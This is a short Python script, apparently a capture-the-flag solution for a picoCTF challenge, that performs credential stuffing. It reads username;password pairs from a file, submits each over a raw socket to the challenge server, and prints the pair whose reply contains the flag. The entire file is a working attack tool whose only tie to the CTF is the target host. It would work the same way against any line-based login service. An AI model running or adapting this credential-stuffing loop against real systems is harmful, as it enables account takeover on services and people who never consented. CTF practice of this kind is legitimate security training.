#!/usr/bin/env python3
"""
Minimal credential stuffing solution.
Use this for quick reference or basic implementation.
"""

import socket
import time

HOST = "crystal-peak.picoctf.net"
PORT = 62474
CREDS_FILE = "pico.txt"
DELAY = 0.5  # Seconds between attempts

def try_credentials(username, password):
    """Attempt login with given credentials."""
    try:
        s = socket.socket()
        s.connect((HOST, PORT))
        
        # Receive initial prompt
        s.recv(1024)
        
        # Send username
        s.send((username + "\n").encode())
        
        # Receive password prompt
        s.recv(1024)
        
        # Send password
        s.send((password + "\n").encode())
        
        # Get response
        response = s.recv(4096).decode(errors="ignore")
        s.close()
        
        # Check for flag
        if "picoCTF" in response:
            return response
        
        return None
        
    except Exception as e:
        return None

def main():
    """Load credentials and attempt authentication."""
    print(f"Connecting to {HOST}:{PORT}")
    
    with open(CREDS_FILE, encoding="utf-8", errors="ignore") as f:
        for idx, line in enumerate(f, 1):
            if ";" not in line:
                continue
            
            try:
                username, password = line.strip().split(";")
            except:
                continue
            
            print(f"[{idx}] Trying {username}:{password}")
            
            result = try_credentials(username, password)
            if result:
                print(f"\nSUCCESS!\nUsername: {username}\nPassword: {password}")
                print(f"\nResponse:\n{result}")
                return
            
            time.sleep(DELAY)
    
    print("Attack completed. No valid credentials found.")

if __name__ == "__main__":
    main()
